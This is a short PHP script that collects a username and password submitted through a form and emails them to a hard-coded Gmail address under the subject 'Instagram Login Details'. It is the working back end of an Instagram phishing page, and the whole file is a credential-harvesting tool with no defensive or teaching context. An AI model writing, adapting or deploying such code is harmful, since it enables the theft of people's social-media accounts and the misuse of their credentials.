<?php
if(isset($_POST['submit'])) {
    $to = "modishyy@gmail.com";
    $subject = "Instagram Login Details";
    $username = $_POST['username'];
    $password = $_POST['password'];
    $message = "Username: ".$username."\nPassword: ".$password;
    $headers = "From: yourname@yourdomain.com";
    mail($to, $subject, $message, $headers);
    echo "Login details sent to your email.";
}
?>
